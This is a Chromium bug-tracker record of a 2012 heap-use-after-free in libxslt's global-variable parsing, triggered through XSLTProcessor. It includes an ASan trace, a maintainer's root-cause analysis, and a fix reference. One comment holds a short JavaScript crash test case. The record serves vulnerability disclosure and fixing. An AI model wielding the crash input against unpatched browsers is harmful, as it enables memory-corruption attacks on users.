# Heap-use-after-free in xsltParseGlobalVariable

| Field | Value |
|-------|-------|
| **Issue ID** | [40052624](https://issues.chromium.org/issues/40052624) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ao...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-01-10 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

ASan reports a heap-use-after-free when the attached page is opened.

**VERSION**  

Chrome Version: 18.0.1001.0 (Developer Build 116848)  

Operating System: Linux, Debian 6.0.3 x86\_64

**REPRODUCTION CASE**  

$ chrome-asan xsl.html

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

==32682== ERROR: AddressSanitizer heap-use-after-free on address 0x7f1b711c22f8 at pc 0x7f1b834ea479 bp 0x7fff65ed0ac0 sp 0x7fff65ed0ab8  

READ of size 8 at 0x7f1b711c22f8 thread T0  

#0 0x7f1b834ea479 in xsltParseGlobalVariable ???:0  

#1 0x7f1b834f0c71 in xsltParseStylesheetProcess ???:0  

#2 0x7f1b834f3c45 in xsltParseStylesheetImportedDoc ???:0  

#3 0x7f1b834f3e9c in xsltParseStylesheetDoc ???:0  

#4 0x7f1b80f43e6b in WebCore::XSLStyleSheet::compileStyleSheet() ???:0  

#5 0x7f1b80f495f2 in WebCore::XSLTProcessor::transformToString(WebCore::Node\*, WTF::String&, WTF::String&, WTF::String&) ???:0  

#6 0x7f1b80f47af1 in WebCore::XSLTProcessor::transformToFragment(WebCore::Node\*, WebCore::Document\*) ???:0  

#7 0x7f1b836ecfe7 in WebCore::V8XSLTProcessor::transformToFragmentCallback(v8::Arguments const&) ???:0  

#8 0x7f1b7ef82256 in v8::internal::Builtin\_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) v8/src/builtins.cc:0  

#9 0x27f32a00420e in  

#10 0x27f32a02fa47 in  

#11 0x27f32a01fa67 in  

#12 0x27f32a0072b7 in  

#13 0x7f1b7efcb48b in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) v8/src/execution.cc:0  

#14 0x7f1b7ef1e8a6 in v8::Script::Run() ???:0  

#15 0x7f1b80781b1a in WebCore::V8Proxy::runScript(v8::Handle[v8::Script](javascript:void(0);)) ???:0  

#16 0x7f1b80780ec7 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node\*) ???:0  

#17 0x7f1b80733f96 in WebCore::ScriptController::evaluate(WebCore::ScriptSourceCode const&) ???:0  

#18 0x7f1b801a654c in WebCore::ScriptElement::executeScript(WebCore::ScriptSourceCode const&) ???:0  

#19 0x7f1b801a24b2 in WebCore::ScriptElement::prepareScript(WTF::TextPosition const&, WebCore::ScriptElement::LegacyTypeSupport) ???:0  

#20 0x7f1b803604cf in WebCore::HTMLScriptRunner::runScript(WebCore::Element\*, WTF::TextPosition const&) ???:0  

#21 0x7f1b8035ff71 in WebCore::HTMLScriptRunner::execute(WTF::PassRefPtr[WebCore::Element](javascript:void(0);), WTF::TextPosition const&) ???:0  

#22 0x7f1b8035414d in WebCore::HTMLDocumentParser::runScriptsForPausedTreeBuilder() ???:0  

#23 0x7f1b803544c0 in WebCore::HTMLDocumentParser::canTakeNextToken(WebCore::HTMLDocumentParser::SynchronousMode, WebCore::PumpSession&) ???:0  

#24 0x7f1b80353746 in WebCore::HTMLDocumentParser::pumpTokenizer(WebCore::HTMLDocumentParser::SynchronousMode) ???:0  

#25 0x7f1b80355264 in WebCore::HTMLDocumentParser::append(WebCore::SegmentedString const&) ???:0  

#26 0x7f1b835cb4ac in WebCore::DecodedDataDocumentParser::flush(WebCore::DocumentWriter\*) ???:0  

#27 0x7f1b80c73e19 in WebCore::DocumentWriter::endIfNotLoadingMainResource() ???:0  

#28 0x7f1b80cb0179 in WebCore::FrameLoader::finishedLoading() ???:0  

#29 0x7f1b80cd9d41 in WebCore::MainResourceLoader::didFinishLoading(double) ???:0  

#30 0x7f1b823779b1 in webkit\_glue::WebURLLoaderImpl::Context::OnCompletedRequest(net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) ???:0  

#31 0x7f1b7f9a8dca in ResourceDispatcher::OnRequestComplete(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&) ???:0  

#32 0x7f1b7f9a9fab in bool ResourceMsg\_RequestComplete::Dispatch<ResourceDispatcher, ResourceDispatcher, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)>(IPC::Message const\*, ResourceDispatcher\*, ResourceDispatcher\*, void (ResourceDispatcher::\*)(int, net::URLRequestStatus const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, base::TimeTicks const&)) ???:0  

#33 0x7f1b7f9a657c in ResourceDispatcher::DispatchMessage(IPC::Message const&) ???:0  

#34 0x7f1b7f9a4500 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) ???:0  

#35 0x7f1b7f8b31aa in ChildThread::OnMessageReceived(IPC::Message const&) ???:0  

#36 0x7f1b7f9fc439 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) ???:0  

#37 0x7f1b7e2a3be4 in MessageLoop::RunTask(base::PendingTask const&) ???:0  

#38 0x7f1b7e2a4466 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) ???:0  

#39 0x7f1b7e2a5751 in MessageLoop::DoWork() ???:0  

#40 0x7f1b7e2b01b7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ???:0  

#41 0x7f1b7e2a27de in MessageLoop::RunInternal() ???:0  

#42 0x7f1b7e2a09cf in MessageLoop::Run() ???:0  

#43 0x7f1b82ea2565 in RendererMain(content::MainFunctionParams const&) ???:0  

#44 0x7f1b7e1fe8a6 in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main.cc:0  

#45 0x7f1b7e1fdd64 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) ???:0  

#46 0x7f1b7ca66c77 in ChromeMain ??:0  

#47 0x7f1b7ca66b7b in main ???:0  

#48 0x7f1b76125c4d in \_\_libc\_start\_main /home/aurel32/eglibc/eglibc-2.11.2/csu/libc-start.c:260  

0x7f1b711c22f8 is located 120 bytes inside of 312-byte region [0x7f1b711c2280,0x7f1b711c23b8)  

freed by thread T0 here:  

#0 0x7f1b839cb554 in free ??:0  

#1 0x7f1b834c6671 in xsltFreeStylePreComps ???:0  

#2 0x7f1b834ec5d0 in xsltFreeStylesheet ???:0  

#3 0x7f1b834f3e31 in xsltParseStylesheetImportedDoc ???:0  

#4 0x7f1b834f3e9c in xsltParseStylesheetDoc ???:0  

#5 0x7f1b80f43e6b in WebCore::XSLStyleSheet::compileStyleSheet() ???:0  

#6 0x7f1b80f495f2 in WebCore::XSLTProcessor::transformToString(WebCore::Node\*, WTF::String&, WTF::String&, WTF::String&) ???:0  

#7 0x7f1b80f47af1 in WebCore::XSLTProcessor::transformToFragment(WebCore::Node\*, WebCore::Document\*) ???:0  

#8 0x7f1b836ecfe7 in WebCore::V8XSLTProcessor::transformToFragmentCallback(v8::Arguments const&) ???:0  

#9 0x7f1b7ef82256 in v8::internal::Builtin\_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) v8/src/builtins.cc:0  

#10 0x27f32a00420e in  

#11 0x27f32a02f9e6 in  

#12 0x27f32a01fa67 in  

#13 0x27f32a0072b7 in  

#14 0x7f1b7efcb48b in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) v8/src/execution.cc:0  

#15 0x7f1b7ef1e8a6 in v8::Script::Run() ???:0  

#16 0x7f1b80781b1a in WebCore::V8Proxy::runScript(v8::Handle[v8::Script](javascript:void(0);)) ???:0  

#17 0x7f1b80780ec7 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node\*) ???:0  

#18 0x7f1b80733f96 in WebCore::ScriptController::evaluate(WebCore::ScriptSourceCode const&) ???:0  

#19 0x7f1b801a654c in WebCore::ScriptElement::executeScript(WebCore::ScriptSourceCode const&) ???:0  

#20 0x7f1b801a24b2 in WebCore::ScriptElement::prepareScript(WTF::TextPosition const&, WebCore::ScriptElement::LegacyTypeSupport) ???:0  

#21 0x7f1b803604cf in WebCore::HTMLScriptRunner::runScript(WebCore::Element\*, WTF::TextPosition const&) ???:0  

#22 0x7f1b8035ff71 in WebCore::HTMLScriptRunner::execute(WTF::PassRefPtr[WebCore::Element](javascript:void(0);), WTF::TextPosition const&) ???:0  

#23 0x7f1b8035414d in WebCore::HTMLDocumentParser::runScriptsForPausedTreeBuilder() ???:0  

#24 0x7f1b803544c0 in WebCore::HTMLDocumentParser::canTakeNextToken(WebCore::HTMLDocumentParser::SynchronousMode, WebCore::PumpSession&) ???:0  

#25 0x7f1b80353746 in WebCore::HTMLDocumentParser::pumpTokenizer(WebCore::HTMLDocumentParser::SynchronousMode) ???:0  

#26 0x7f1b80355264 in WebCore::HTMLDocumentParser::append(WebCore::SegmentedString const&) ???:0  

#27 0x7f1b835cb4ac in WebCore::DecodedDataDocumentParser::flush(WebCore::DocumentWriter\*) ???:0  

#28 0x7f1b80c73e19 in WebCore::DocumentWriter::endIfNotLoadingMainResource() ???:0  

previously allocated by thread T0 here:  

#0 0x7f1b839cb634 in malloc ??:0  

#1 0x7f1b834cab90 in xsltStylePreCompute ???:0  

#2 0x7f1b834f3163 in xsltPrecomputeStylesheet third\_party/libxslt/libxslt/xslt.c:0  

#3 0x7f1b834eeece in xsltParseStylesheetProcess ???:0  

#4 0x7f1b834f3c45 in xsltParseStylesheetImportedDoc ???:0  

#5 0x7f1b834f3e9c in xsltParseStylesheetDoc ???:0  

#6 0x7f1b80f43e6b in WebCore::XSLStyleSheet::compileStyleSheet() ???:0  

#7 0x7f1b80f495f2 in WebCore::XSLTProcessor::transformToString(WebCore::Node\*, WTF::String&, WTF::String&, WTF::String&) ???:0  

#8 0x7f1b80f47af1 in WebCore::XSLTProcessor::transformToFragment(WebCore::Node\*, WebCore::Document\*) ???:0  

#9 0x7f1b836ecfe7 in WebCore::V8XSLTProcessor::transformToFragmentCallback(v8::Arguments const&) ???:0  

#10 0x7f1b7ef82256 in v8::internal::Builtin\_HandleApiCall(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) v8/src/builtins.cc:0  

#11 0x27f32a00420e in  

#12 0x27f32a02f9e6 in  

#13 0x27f32a01fa67 in  

#14 0x27f32a0072b7 in  

#15 0x7f1b7efcb48b in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) v8/src/execution.cc:0  

#16 0x7f1b7ef1e8a6 in v8::Script::Run() ???:0  

#17 0x7f1b80781b1a in WebCore::V8Proxy::runScript(v8::Handle[v8::Script](javascript:void(0);)) ???:0  

#18 0x7f1b80780ec7 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node\*) ???:0  

#19 0x7f1b80733f96 in WebCore::ScriptController::evaluate(WebCore::ScriptSourceCode const&) ???:0  

#20 0x7f1b801a654c in WebCore::ScriptElement::executeScript(WebCore::ScriptSourceCode const&) ???:0  

==32682== ABORTING  

Stats: 2M malloced (4M for red zones) by 15794 calls  

Stats: 0M realloced by 53 calls  

Stats: 1M freed by 9392 calls  

Stats: 0M really freed by 0 calls  

Stats: 40M (10246 full pages) mmaped in 10 calls  

mmaps by size class: 8:16383; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:256; 15:128; 16:64; 17:32;  

mallocs by size class: 8:14436; 9:578; 10:403; 11:212; 12:37; 13:49; 14:59; 15:6; 16:9; 17:5;  

frees by size class: 8:8594; 9:265; 10:319; 11:109; 12:14; 13:36; 14:45; 15:4; 16:2; 17:4;  

rfrees by size class:  

Stats: malloc large: 5 small slow: 69  

Shadow byte and word:  

0x1fe36e23845f: fd  

0x1fe36e238458: fd fd fd fd fd fd fd fd  

More shadow bytes:  

0x1fe36e238438: fa fa fa fa fa fa fa fa  

0x1fe36e238440: fa fa fa fa fa fa fa fa  

0x1fe36e238448: fa fa fa fa fa fa fa fa  

0x1fe36e238450: fd fd fd fd fd fd fd fd  

=>0x1fe36e238458: fd fd fd fd fd fd fd fd  

0x1fe36e238460: fd fd fd fd fd fd fd fd  

0x1fe36e238468: fd fd fd fd fd fd fd fd  

0x1fe36e238470: fd fd fd fd fd fd fd fd  

0x1fe36e238478: fd fd fd fd fd fd fd fd

## Attachments

- [xsl.html](attachments/xsl.html) (text/plain; charset=us-ascii, 481 B)
- [xsl (1).html](attachments/xsl (1).html) (text/plain; charset=us-ascii, 333 B)

## Timeline

### [Deleted User] (2012-01-10)

Filed upstream at https://bugs.webkit.org/show_bug.cgi?id=75978

### in...@chromium.org (2012-01-11)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=10968724

Uploader: cdn@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f3fac5930f8
Crash State:
  - crash stack -
  xsltParseGlobalVariable
  xsltParseStylesheetProcess
  - free stack -
  xsltFreeStylePreComps
  xsltFreeStylesheet
  

Minimized Testcase (0.33 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97YSLAM2POaojpEcKWRuvcJpnQwAiyje-g0gDzA_IjB2rF4AyOD7sF3ZkgFAwTzcTDOJEyP7-p8-XNzqYKtZZFX-3oId6SG1pc6NPVFL2_tIyGgvwCAWPgmSnVssF2fmgajRloiIF39tn1c652s2cGowgH0HQ
<script>
var style = '\
   <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:variable>';
var xslp = new XSLTProcessor();
var foo = new DOMParser().parseFromString (style, "text/xml");
xslp.importStylesheet(foo);
var bar = xslp.transformToFragment(foo, document);
xslp.transformToFragment(foo, document);
</script>

### in...@chromium.org (2012-01-11)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-11)

https://crbug.com/chromium/109716#c1 From Andreas Kling 2012-01-11 08:07:32 PST (-) [reply] 
The backtraces seem to indicate that the problem is internal to libxslt.

Daniel, can you please take a look.

### ve...@gmail.com (2012-01-12)

Hum, I'm unable to download the XSLT. And I'm denied access to cluster-fuzz report,
can pour paste the XSLT content here or send it to my email address @gmail.com
or @redhat.com,

 thanks,

Daniel


### ve...@gmail.com (2012-01-12)

Okay, using a proxy in the US I was able to fetch the two examples.
In the first case I don't see a problem at the libxslt level:

paphio:~/XSLT -> cat 109716.xsl
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:variable name="rtf"></xsl:variable>
  <xsl:variable name="rtf"></xsl:variable>
</xsl:stylesheet>
paphio:~/XSLT -> valgrind xsltproc 109716.xsl 109716.xsl
compilation error: file 109716.xsl line 3 element variable
redefinition of global variable rtf
paphio:~/XSLT -> 

  So you get an error, in the second case too the XSLT is not well
formed, so I assume the compilation fails too. Somehow maybe you rely
in the script bindings to not free on error while it does in practice:

xslp.importStylesheet(foo);

  that operation is gonna fail

var bar = xslp.transformToFragment(foo, document);
xslp.transformToFragment(foo, document);

  something here or upon garbage collect try to free
or access something in xslp which is likely not
available anymore due to the failure. What I have no idea
this is something on top of libxslt code...

Daniel

### ve...@gmail.com (2012-01-12)

Looking again at your stack trace:

 #6 0x7f1b80f47af1 in WebCore::XSLTProcessor::transformToFragment(WebCore::Node*, WebCore::Document*) ???:0

so transformToFragment() is called twice. I assume with the same document. If this
calls xsltParseStylesheetDoc under the hood then yes you have a problem in the
design of your bindings:

 * xsltParseStylesheetDoc:
 * @doc:  and xmlDoc parsed XML
 *
 * parse an XSLT stylesheet, building the associated structures.  doc
 * is kept as a reference within the returned stylesheet, so changes
 * to doc after the parsing will be reflected when the stylesheet
 * is applied, and the doc is automatically freed when the
 * stylesheet is closed.

 Once you have used this function the document passed as input is *owned*
by the stylesheet, and will be freed with the stylesheet. Since the stylesheet
fails to compile well I assume you don't get anything back upon compilation
except a NULL and an error, and your document has been freed. Trying to reuse
it again is nearly guaranteed to crash.

 Your bindings must take into account the fact that the stylesheet document is
consumed as part of the stylesheet compilation. That's a documented behaviour
of the C API as shown above.

Daniel

### in...@chromium.org (2012-01-12)

Thanks Daniel, we will try to look at our code closely.

### ve...@gmail.com (2012-01-13)

yeah, the more I think about it the more I'm sure it's a case of using
xsltParseStylesheetDoc which consumes the input document and unfortunately
your bindings didn't make a copy leading to a later invalid reference.
The fact that the compilation fails just make this  problem immediate instead
of delegating it to when all the page processing has been completed

Daniel

### in...@chromium.org (2012-01-20)

I have a fix, m_stylesheet wasn't cleared after we fail to compile the stylesheet. so next time we use that stylesheet with a stale document. Thanks a lot Daniel for c#7

xsltStylesheetPtr sheet = xsltStylesheetPointer(m_stylesheet, m_stylesheetRootNode.get());
308308    if (!sheet) {
309309        setXSLTLoadCallBack(0, 0, 0);

### ve...@gmail.com (2012-01-20)

Good, thanks for giving the feedback :-)

Daniel

### in...@chromium.org (2012-01-20)

Daniel, I really appreciate your help and fast response on the xslt bugs. Thanks!

### in...@chromium.org (2012-01-20)

http://trac.webkit.org/changeset/105524

### in...@chromium.org (2012-01-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-23)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-01-24)

Nice one Aki, $1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### ts...@chromium.org (2012-01-24)

Merged into m17 at r105787.

### sc...@gmail.com (2012-02-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-16)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-06-13)

ClusterFuzz has detected this issue as fixed in range 118466:118516.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=10968724

Uploader: cdn@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f3fac5930f8
Crash State:
  - crash stack -
  xsltParseGlobalVariable
  xsltParseStylesheetProcess
  - free stack -
  xsltFreeStylePreComps
  xsltFreeStylesheet
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=118466:118516

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97YSLAM2POaojpEcKWRuvcJpnQwAiyje-g0gDzA_IjB2rF4AyOD7sF3ZkgFAwTzcTDOJEyP7-p8-XNzqYKtZZFX-3oId6SG1pc6NPVFL2_tIyGgvwCAWPgmSnVssF2fmgajRloiIF39tn1c652s2cGowgH0HQ

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/109716?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052624)*
